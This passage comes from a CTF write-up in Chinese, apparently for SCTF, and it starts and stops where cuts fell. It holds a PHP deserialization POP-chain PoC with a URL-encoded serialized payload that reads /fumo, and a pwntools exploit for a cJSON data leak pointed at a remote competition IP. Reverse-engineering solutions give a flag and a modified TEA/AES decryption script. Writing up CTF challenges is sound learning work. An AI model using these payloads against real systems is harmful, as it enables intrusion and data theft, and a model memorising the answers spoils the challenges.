\u0026#39; \u0026#39; \u0026lt;\u0026lt; a[tmp].func \u0026lt;\u0026lt; endl; string use_obj = prew[tmp].X, pass_way = prew[tmp].Y; tmp = pre[tmp]; while(tmp != -1) { cout \u0026lt;\u0026lt; a[tmp].name \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; a[tmp].func \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; use_obj \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; pass_way \u0026lt;\u0026lt; endl; use_obj = prew[tmp].X, pass_way = prew[tmp].Y; tmp = pre[tmp]; } cout \u0026lt;\u0026lt; endl; return; } for (int i = first[now]; i != -1; i = e[i].next) { if(e[i].v != fa \u0026amp;\u0026amp; !vis[e[i].v]) { if(e[i].w.Y == \u0026#34;base64_encode\u0026#34;)continue; if(e[i].w.Y == \u0026#34;ucfirst\u0026#34;)continue; pre[e[i].v] = now; prew[e[i].v] = e[i].w; dfs(e[i].v, now); } } } int main() { mem(first, -1); freopen(\u0026#34;data.txt\u0026#34;, \u0026#34;rb\u0026#34;, stdin); freopen(\u0026#34;ans.txt\u0026#34;, \u0026#34;w\u0026#34;, stdout); int start = 1; n = read(); string params; for (int i = 1; i \u0026lt;= n; i++) { cin \u0026gt;\u0026gt; name[i] \u0026gt;\u0026gt; func[i]; a[i] = Class(name[i], func[i]); M[a[i]] = i; } int m = read(); for(int i=1;i\u0026lt;=m;i++){ string class_name, func_name, use_obj, use_func, pass_way; cin \u0026gt;\u0026gt; class_name \u0026gt;\u0026gt; func_name \u0026gt;\u0026gt; use_obj \u0026gt;\u0026gt; use_func \u0026gt;\u0026gt; pass_way;//$class_name.\u0026#39; \u0026#39;.$func_name.\u0026#39; \u0026#39;.$use_obj.\u0026#34; \u0026#34;.$use_func.\u0026#34; \u0026#34;.$pass_way \tint id = 1; for (int j = 1; j \u0026lt;= n; j++) if (class_name == name[j] \u0026amp;\u0026amp; func_name == func[j]) { id = j; break; } match(a[id], use_func, use_obj, pass_way); } int o = read(); for (int i = 1; i \u0026lt;= o; i++) { string x, y, z; cin \u0026gt;\u0026gt; x \u0026gt;\u0026gt; y \u0026gt;\u0026gt; z; int id = 0; for (int j = 1; j \u0026lt;= n; j++) if(x == name[j] \u0026amp;\u0026amp; y == func[j]) { id=j; break; } if(id==0)cout\u0026lt;\u0026lt;x\u0026lt;\u0026lt;\u0026#39; \u0026#39;\u0026lt;\u0026lt;y\u0026lt;\u0026lt;endl; tag[id] = 1; } pre[start] = -1; dfs(start, -1); cout\u0026lt;\u0026lt;count_chain; return 0; } 刚好只有一条可行链，倒序打印链：\nAN9pNsmlT Fhh5TZoD0 Ugh4SYk00D bLqi60vf tQF7ER str_rot13 xEFW8yw08 gvgCPyi nYuAuh2 str_rot13 Xl5V1fEbzD Z5G5uz fgVgm4TV97 pass d9vgRnlEA trZx9DLGq T4rUU9R base64_decode Ronyv7u Uaxr3XOrz uDQ0ehd4p strrev T6Y5QYS GP5h5gz p9mwE7l str_rot13 SKVnfvfbas gkbXYD UOvWbl pass o5d0ioNZ vBmg2S exGoDOPm str_rot13 FK0LfIlrxm uxVcfoc gZ9IzdbF6T pass eHSt3I5L30 YbMfp8D9 exoEH1 pass c76So3oF EttYcl6 cwQWOIEL strrev u1q3m04qZb EtQ6pQB NGIlAGGLv pass xT506K QiVLzL Dblxvn pass p6NArTi YgmXN30 VbpsE7wqUH base64_decode ezlgUUHCdQ lwUpo3 fDViVU pass uGnuU5pGgQ cc60Kte4Em XbW5o6yiGv base64_decode GGcIkQ6E a2l0Eeqr CK5OgoyC strrev vS1qenzGWr kR5Y66g yrVWMn9 pass amg2Vw __destruct PCR49GlRM pass 根据上述链的写脚本构造 poc：\nfp = open(\u0026#39;popchain.txt\u0026#39;, \u0026#39;r\u0026#39;) fo = open(\u0026#39;poc.php\u0026#39;, \u0026#39;w\u0026#39;) fo.write(\u0026#39;\u0026lt;?php\\nnamespace christmasTree{\\n\u0026#39;) line_list = [] for line in fp.readlines(): line = line.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;) line_list.append(line) line_list = line_list[::-1] for i, line in enumerate(line_list[:-1]): class_name, func_name, use_obj, _ = line.split(\u0026#39; \u0026#39;) if i == 0: start_point = class_name next_name = line_list[i + 1].split(\u0026#39; \u0026#39;)[0] print(class_name, func_name, use_obj, next_name) payload = \u0026#39;\u0026#39;\u0026#39;class %s{ public $%s; public function __construct(){ $this-\u0026gt;%s= new %s(); } } \u0026#39;\u0026#39;\u0026#39; % (class_name, use_obj, use_obj, next_name) fo.write(payload + \u0026#39;\\n\u0026#39;) class_name, func_name = line_list[-1].split(\u0026#39; \u0026#39;) payload = \u0026#39;\u0026#39;\u0026#39;class %s{ public $%s; } \u0026#39;\u0026#39;\u0026#39; % (class_name, use_obj) fo.write(payload + \u0026#39;\\necho urlencode(serialize(new %s()));}\u0026#39; % start_point) print(class_name, func_name) 生成的 poc 不能直接打通，因为要求类内所有 public 属性都要进行赋值，对生成的 poc 还需要手动修改，对未利用的对象赋为 stdClass() 最终的poc：\n\u0026lt;?php namespace christmasTree{ class amg2Vw{ public $PCR49GlRM; public function __construct(){ $this-\u0026gt;PCR49GlRM = new vS1qenzGWr(); } } class vS1qenzGWr{ public $yrVWMn9; public $S839pvNRU; public function __construct(){ $this-\u0026gt;yrVWMn9 = new GGcIkQ6E(); $this-\u0026gt;S839pvNRU = new \\stdClass(); } } class GGcIkQ6E{ public $CK5OgoyC; public $Vkyud3; public function __construct(){ $this-\u0026gt;CK5OgoyC = new uGnuU5pGgQ(); $this-\u0026gt;Vkyud3 = new \\stdClass(); } } class uGnuU5pGgQ{ public $XbW5o6yiGv; public $XEH9BQ; public function __construct(){ $this-\u0026gt;XbW5o6yiGv = new ezlgUUHCdQ(); $this-\u0026gt;XEH9BQ = new \\stdClass(); } } class ezlgUUHCdQ{ public $fDViVU; public function __construct(){ $this-\u0026gt;fDViVU = new p6NArTi(); } } class p6NArTi{ public $VbpsE7wqUH; public $yKwNrpRAQ; public function __construct(){ $this-\u0026gt;VbpsE7wqUH = new xT506K(); $this-\u0026gt;yKwNrpRAQ = new \\stdClass(); } } class xT506K{ public $Dblxvn; public $sPEbogX4; public function __construct(){ $this-\u0026gt;Dblxvn = new u1q3m04qZb(); $this-\u0026gt;sPEbogX4 = new \\stdClass(); } } class u1q3m04qZb{ public $NGIlAGGLv; public function __construct(){ $this-\u0026gt;NGIlAGGLv = new c76So3oF(); } } class c76So3oF{ public $cwQWOIEL; public $rHYG3Wr; public function __construct(){ $this-\u0026gt;cwQWOIEL = new eHSt3I5L30(); $this-\u0026gt;rHYG3Wr = new \\stdClass(); } } class eHSt3I5L30{ public $exoEH1; public $UO4yLd; public function __construct(){ $this-\u0026gt;exoEH1 = new FK0LfIlrxm(); $this-\u0026gt;UO4yLd = new \\stdClass(); } } class FK0LfIlrxm{ public $gZ9IzdbF6T; public $Q7mg44bg; public function __construct(){ $this-\u0026gt;gZ9IzdbF6T = new o5d0ioNZ(); $this-\u0026gt;Q7mg44bg = new \\stdClass(); } } class o5d0ioNZ{ public $exGoDOPm; public $TEODq2c3Uo; public function __construct(){ $this-\u0026gt;exGoDOPm = new SKVnfvfbas(); $this-\u0026gt;TEODq2c3Uo = new \\stdClass(); } } class SKVnfvfbas{ public $UOvWbl; public $m4pnFndZoX; public function __construct(){ $this-\u0026gt;UOvWbl = new T6Y5QYS(); $this-\u0026gt;m4pnFndZoX = new \\stdClass(); } } class T6Y5QYS{ public $p9mwE7l; public $aysl2yR5g; public function __construct(){ $this-\u0026gt;p9mwE7l = new Ronyv7u(); $this-\u0026gt;aysl2yR5g = new \\stdClass(); } } class Ronyv7u{ public $uDQ0ehd4p; public $uqkULP0XD; public function __construct(){ $this-\u0026gt;uDQ0ehd4p = new d9vgRnlEA(); $this-\u0026gt;uqkULP0XD = new \\stdClass(); } } class d9vgRnlEA{ public $T4rUU9R; public function __construct(){ $this-\u0026gt;T4rUU9R = new Xl5V1fEbzD(); } } class Xl5V1fEbzD{ public $fgVgm4TV97; public function __construct(){ $this-\u0026gt;fgVgm4TV97 = new xEFW8yw08(); } } class xEFW8yw08{ public $nYuAuh2; public function __construct(){ $this-\u0026gt;nYuAuh2 = new Ugh4SYk00D(); } } class Ugh4SYk00D{ public $tQF7ER; public function __construct(){ $this-\u0026gt;tQF7ER = new AN9pNsmlT(); } } class AN9pNsmlT{ public $Ipz7D3; public function __construct(){ $this-\u0026gt;Ipz7D3 = new \\stdClass(); } } echo urlencode(serialize(new amg2Vw()));} 同时对pop链中的所有编码过程进行逆向，得到最终要进行读 /fumo 的编码结果：\n\u0026lt;?php $fp = fopen(\u0026#34;popchain.txt\u0026#34;, \u0026#34;r\u0026#34;); $payload = \u0026#39;/fumo\u0026#39;; $line = fgets($fp); $list = array(); while(! feof($fp)) { $line = fgets($fp);//fgets()函数从文件指针中读取一行  array_push($list, trim($line)); $line = trim(explode(\u0026#34; \u0026#34;,$line)[3]); echo $line.\u0026#34;\\n\u0026#34;; if($line === \u0026#34;pass\u0026#34;) { continue; } else if($line === \u0026#34;base64_decode\u0026#34;) { $payload = base64_encode($payload); } else if($line === \u0026#34;ucfirst\u0026#34;) { continue; } else if($line === \u0026#34;strrev\u0026#34;) { $payload = strrev($payload); } else if($line === \u0026#34;str_rot13\u0026#34;) { $payload = str_rot13($payload); } } echo $payload.\u0026#34;\\n\u0026#34;; $list = array_reverse($list); foreach($list as $line){ $line = explode(\u0026#34; \u0026#34;,$line)[3]; if($line === \u0026#34;pass\u0026#34;) { continue; } else if($line === \u0026#34;base64_decode\u0026#34;) { $payload = base64_decode($payload); } else if($line === \u0026#34;ucfirst\u0026#34;) { continue; } else if($line === \u0026#34;strrev\u0026#34;) { $payload = strrev($payload); } else if($line === \u0026#34;str_rot13\u0026#34;) { $payload = str_rot13($payload); } } echo $payload; fclose($fp); 最终序列化链：\nO%3A20%3A%22christmasTree%5Camg2Vw%22%3A1%3A%7Bs%3A9%3A%22PCR49GlRM%22%3BO%3A24%3A%22christmasTree%5CvS1qenzGWr%22%3A2%3A%7Bs%3A7%3A%22yrVWMn9%22%3BO%3A22%3A%22christmasTree%5CGGcIkQ6E%22%3A2%3A%7Bs%3A8%3A%22CK5OgoyC%22%3BO%3A24%3A%22christmasTree%5CuGnuU5pGgQ%22%3A2%3A%7Bs%3A10%3A%22XbW5o6yiGv%22%3BO%3A24%3A%22christmasTree%5CezlgUUHCdQ%22%3A1%3A%7Bs%3A6%3A%22fDViVU%22%3BO%3A21%3A%22christmasTree%5Cp6NArTi%22%3A2%3A%7Bs%3A10%3A%22VbpsE7wqUH%22%3BO%3A20%3A%22christmasTree%5CxT506K%22%3A2%3A%7Bs%3A6%3A%22Dblxvn%22%3BO%3A24%3A%22christmasTree%5Cu1q3m04qZb%22%3A1%3A%7Bs%3A9%3A%22NGIlAGGLv%22%3BO%3A22%3A%22christmasTree%5Cc76So3oF%22%3A2%3A%7Bs%3A8%3A%22cwQWOIEL%22%3BO%3A24%3A%22christmasTree%5CeHSt3I5L30%22%3A2%3A%7Bs%3A6%3A%22exoEH1%22%3BO%3A24%3A%22christmasTree%5CFK0LfIlrxm%22%3A2%3A%7Bs%3A10%3A%22gZ9IzdbF6T%22%3BO%3A22%3A%22christmasTree%5Co5d0ioNZ%22%3A2%3A%7Bs%3A8%3A%22exGoDOPm%22%3BO%3A24%3A%22christmasTree%5CSKVnfvfbas%22%3A2%3A%7Bs%3A6%3A%22UOvWbl%22%3BO%3A21%3A%22christmasTree%5CT6Y5QYS%22%3A2%3A%7Bs%3A7%3A%22p9mwE7l%22%3BO%3A21%3A%22christmasTree%5CRonyv7u%22%3A2%3A%7Bs%3A9%3A%22uDQ0ehd4p%22%3BO%3A23%3A%22christmasTree%5Cd9vgRnlEA%22%3A1%3A%7Bs%3A7%3A%22T4rUU9R%22%3BO%3A24%3A%22christmasTree%5CXl5V1fEbzD%22%3A1%3A%7Bs%3A10%3A%22fgVgm4TV97%22%3BO%3A23%3A%22christmasTree%5CxEFW8yw08%22%3A1%3A%7Bs%3A7%3A%22nYuAuh2%22%3BO%3A24%3A%22christmasTree%5CUgh4SYk00D%22%3A1%3A%7Bs%3A6%3A%22tQF7ER%22%3BO%3A23%3A%22christmasTree%5CAN9pNsmlT%22%3A1%3A%7Bs%3A6%3A%22Ipz7D3%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7D%7D%7D%7D%7Ds%3A9%3A%22uqkULP0XD%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A9%3A%22aysl2yR5g%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A10%3A%22m4pnFndZoX%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A10%3A%22TEODq2c3Uo%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A8%3A%22Q7mg44bg%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A6%3A%22UO4yLd%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A7%3A%22rHYG3Wr%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7D%7Ds%3A8%3A%22sPEbogX4%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A9%3A%22yKwNrpRAQ%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7D%7Ds%3A6%3A%22XEH9BQ%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A6%3A%22Vkyud3%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A9%3A%22S839pvNRU%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7D%7D 然后调用的参数：9ADRPhlSX1UYKREV 即可读到 /fumo\nPwn dataleak 核心是调用了 cJSON_Minify 这个函数，这个函数差不多就是省略调所有的注释，读给的 libc 的源码可以发现，/* 在判断 \\x00 后仍然有 +=2 这个操作于是可以弥补调读入 0xe 剩下的两个空字节，然后可以分段泄露出data\nfrom pwn import * import sys context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) if len(sys.argv) \u0026lt; 2: debug = True else: debug = False if debug: p = process(\u0026#34;./cJSON_PWN\u0026#34;) libc = ELF(\u0026#34;/lib/x86_64-linux-gnu/libc-2.23.so\u0026#34;) else: p = remote(\u0026#34;124.70.202.226\u0026#34;, 2101) def debugf(b=0): if debug: if b: gdb.attach(p,\u0026#34;b *$rebase({b})\u0026#34;.format(b = hex(b))) else: gdb.attach(p) elf = ELF(\u0026#39;./cJSON_PWN\u0026#39;) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) debugf(0x120D) # sn(b\u0026#34;a\u0026#34;*14) # sn(p64(elf.got[\u0026#34;read\u0026#34;])) sn(b\u0026#34;aaaaaaaaaaa/*a\u0026#34;) sn(b\u0026#34;aaaaa/*\u0026#34; + b\u0026#34;b\u0026#34;*7) sn(b\u0026#34;aaaaa/*\u0026#34; + b\u0026#34;a\u0026#34;*7) sn(b\u0026#34;/*\u0026#34; + b\u0026#34;b\u0026#34;*12) p.interactive() Re godness dance 输入长度 28\n上来是个哈希表做字母频率统计，i 和 u 出现两次，其余 a-z 出现一次\n然后将 0-28 依次放到一个数组里，看了一下密文，发现也是 0-28\n后面的逻辑每分析出来，于是尝试选择明文攻击（后来得知后面的逻辑只是混淆）\ninput: abcdefghijklmnopqrstuvwxyziu output: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 27, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 28, 21, 22, 23, 24, 25, 26 input: abcdefghijklmnopqrstuvwxyzui output: 0, 1, 2, 3, 4, 5, 6, 7, 8, 28, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 27, 21, 22, 23, 24, 25, 26 input: abcdefghijklmnopqrstuvwxyizu output: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 26, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 28, 21, 22, 23, 24, 25, 27 input: zyxwvutsrqponmlkjihgfedcbaiu output: 0, 26, 25, 24, 23, 22, 21, 20, 19, 18, 27, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 28, 6, 5, 4, 3, 2, 1 input: bacdefghijklmnopqrstuvwxyziu output: 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 27, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 28, 21, 22, 23, 24, 25, 26 flag: waltznymphforquickjigsvexbud target: 0, 2, 26, 17, 28, 24, 11, 21, 10, 16, 20, 19, 18, 3, 8, 6, 12, 9, 14, 13, 22, 4, 27, 15, 23, 1, 25, 7, 5 根据动调的结果，判断最后的密文就是把 a-z 的 index 依次放上来\n手动还原 flag\nCPlusExceptionEncrypt 异常处理，在所有的 begin_catch 下面下断点就能恢复流程\n第一个加密是魔改后的tea\nv0 += (sum + i) ^ (((v1 \u0026gt;\u0026gt; 5) + k3) ^ (sum1 + v1) ^ ((v1 \u0026lt;\u0026lt; 4) + k2)) v1 += (sum + i) ^ (((v0 \u0026gt;\u0026gt; 5) + k1) ^ (sum1 + v0) ^ ((v0 \u0026lt;\u0026lt; 4) + k0)) tea 之后对计算结果依次异或 s, c, t, f\n随后进行 AES 轮密钥生成，对拍发现没有魔改\n接下来是魔改后的 AES：\n 修改了最开始的轮密钥加：每个字节另外异或 0x66 随后执行的应该是 9 轮加密  subbyte 用的是 inv_s_box 然后用的是 inv_shift_rows 然后是正向列混淆 正向的轮密钥加   最后是正常的字节替换，行移位和轮密钥加  解密脚本：\naes.py\nfrom galois import GF2 as _GF2 _aes_s_box = [ [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76], [0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0], [0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15], [0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75], [0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84], [0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf], [0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8], [0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2], [0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73], [0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb], [0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79], [0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08], [0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a], [0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e], [0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf], [0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16] ] _aes_s_box_inverse = [ [0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb], [0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb], [0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e], [0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25], [0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92], [0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84], [0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06], [0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b], [0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73], [0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e], [0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b], [0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4], [0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f], [0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef], [0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61], [0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d] ] def _convert_to_array(plain_int): plain_array = [[0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0]] for i in range(4)[::-1]: for j in range(4)[::-1]: plain_array[j][i] = plain_int \u0026amp; 0xff plain_int \u0026gt;\u0026gt;= 8 return plain_array def _get_num_from_sbox(index): row = (index \u0026amp; 0xf0) \u0026gt;\u0026gt; 4 col = index \u0026amp; 0xf return _aes_s_box[row][col] def _get_num_from_sbox_inverse(index): row = (index \u0026amp; 0xf0) \u0026gt;\u0026gt; 4 col = index \u0026amp; 0xf return _aes_s_box_inverse[row][col] def _sub_bytes(input_array): for i in range(4): for j in range(4): input_array[i][j] = _get_num_from_sbox(input_array[i][j]) def _sub_bytes_inverse(input_array): for i in range(4): for j in range(4): input_array[i][j] = _get_num_from_sbox_inverse(input_array[i][j]) def _shift_rows(input_array): input_array[1] = input_array[1][1:] + [input_array[1][0]] input_array[2] = input_array[2][2:] + input_array[2][:2] input_array[3] = [input_array[3][3]] + input_array[3][:3] def _shift_rows_inverse(input_array): input_array[3] = input_array[3][1:] + [ input_array[3][0] ] input_array[2] = input_array[2][2:] + input_array[2][:2] input_array[1] = [ input_array[1][3] ] + input_array[1][:3] columns_matrix = [ [2, 3, 1, 1], [1, 2, 3, 1], [1, 1, 2, 3], [3, 1, 1, 2] ] def _mix_columns(input_array): res_array = [[0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0]] for i in range(4): for j in range(4): res = _GF2(0) for k in range(4): res += _GF2(columns_matrix[i][k]) * _GF2(input_array[k][j]) res %= _GF2(0b100011011) res_array[i][j] = res.data return res_array columns_matrix_inverse = [ [0xe, 0xb, 0xd, 0x9], [0x9, 0xe, 0xb, 0xd], [0xd, 0x9, 0xe, 0xb], [0xb, 0xd, 0x9, 0xe] ] def _mix_columns_inverse(input_array): res_array = [[0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0]] for i in range(4): for j in range(4): res = _GF2(0) for k in range(4): res += _GF2(columns_matrix_inverse[i][k]) * _GF2(input_array[k][j]) res %= _GF2(0b100011011) res_array[i][j] = res.data return res_array def _add_round_key(input_array, key_array): for i in range(4): for j in range(4): input_array[i][j] ^= key_array[i][j] def _key_schedule(pre_key, round): next_key = [[0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0]] # print (pre_key) for i in range(4): next_key[i][0] = pre_key[i - 3][3] _sub_bytes(next_key) for i in range(4): next_key[i][0] ^= pre_key[i][0] next_key[0][0] ^= (_GF2(pow(2, round)) % _GF2(0x11b)).data for i in range(1, 4): for j in range(4): next_key[j][i] = next_key[j][i - 1] ^ pre_key[j][i] return next_key def _aes_key_gen(key): key = _convert_to_array(key) round_key = [key] for i in range(10): round_key.append(_key_schedule(round_key[i], i)) return round_key def _convert_to_int(input_array): output_int = 0 for i in range(4): for j in range(4): output_int \u0026lt;\u0026lt;= 8 output_int |= input_array[j][i] return output_int def sycaes_encrypt(plain_text, key): plain_text ^= key round_key = _aes_key_gen(key) plain_array = _convert_to_array(plain_text) for i in range(1, 10): _sub_bytes_inverse(plain_array) _shift_rows_inverse(plain_array) plain_array = _mix_columns(plain_array) _add_round_key(plain_array, round_key[i]) _sub_bytes(plain_array) _shift_rows(plain_array) _add_round_key(plain_array, round_key[10]) return _convert_to_int(plain_array) def sycaes_decrypt(cipher_text, key): round_key = _aes_key_gen(key)[::-1] cipher_array = _convert_to_array(cipher_text) _add_round_key(cipher_array, round_key[0]) _shift_rows_inverse(cipher_array) _sub_bytes_inverse(cipher_array) for i in range(1, 10): _add_round_key(cipher_array, round_key[i]) cipher_array = _mix_columns_inverse(cipher_array) _shift_rows(cipher_array) _sub_bytes(cipher_array) _add_round_key(cipher_array, round_key[10]) return _convert_to_int(cipher_array) from libnum import * k = \u0026#34;Welcome_to_sctf!\u0026#34; ex_key = _aes_key_gen(s2n(k)) cipher = [ 0xBE, 0x1C, 0xB3, 0xF3, 0xA1, 0xF4, 0xE4, 0x63, 0x11, 0xE1, 0x1C, 0x6B, 0x54, 0x0A, 0xDF, 0x74, 0xF2, 0x93, 0x55, 0xDA, 0x48, 0xFC, 0xA2, 0x3C, 0x89, 0x63, 0x2E, 0x7F, 0x8D, 0xA4, 0x6D, 0x4E ] tmp = 0 for c in cipher[:16]: tmp \u0026lt;\u0026lt;= 8 tmp += c res = n2s(sycaes_decrypt(tmp, s2n(k))) print (s2n(res[:4][::-1])) print (s2n(res[4:8][::-1])) print (s2n(res[8:12][::-1])) print (s2n(res[12:][::-1])) tmp = 0 for c in cipher[16:]: tmp \u0026lt;\u0026lt;= 8 tmp += c res = n2s(sycaes_decrypt(tmp, s2n(k))) print (s2n(res[:4][::-1])) print (s2n(res[4:8][::-1])) print (s2n(res[8:12][::-1])) print (s2n(res[12:][::-1])) galois.py\nclass GF2: def __init__(self, v): self.data = v def __str__(self): return hex(self.data) def __repr__(self): return \u0026#34;GF2(0x%x)\u0026#34; % self.data def __add__(self, other): return GF2(self.data ^ other.data) def __sub__(self, other): return GF2(self.data ^ other.data) def __lshift__(self, other): return GF2(self.data \u0026lt;\u0026lt; other) def __eq__(self, other): if type(other) == type(1): if self.data == other: return True else: return False if type(other) == type(self): if self.data == other.data: return True else: return False return False def __mul__(self, other): ans = 0 for i in range(len(bin(self.data)) - 2): if self.data \u0026amp; (1 \u0026lt;\u0026lt; i): ans ^= other.data \u0026lt;\u0026lt; i return GF2(ans) def __truediv__(self, other): a = self b = other if b.data == 1: return a lena = len(bin(a.data)) - 2 lenb = len(bin(b.data)) - 2 ans = 0 while lena \u0026gt;= lenb: a = a + (b \u0026lt;\u0026lt; lena - lenb) ans += 1 \u0026lt;\u0026lt; (lena - lenb) lena = len(bin(a.data)) - 2 return GF2(ans) def __floordiv__(self, other): return self / other def __isub__(self, other): return self - other def __mod__(self, other): a = self.data b = other.data lena = len(bin(a)) - 2 lenb = len(bin(b)) - 2 for i in 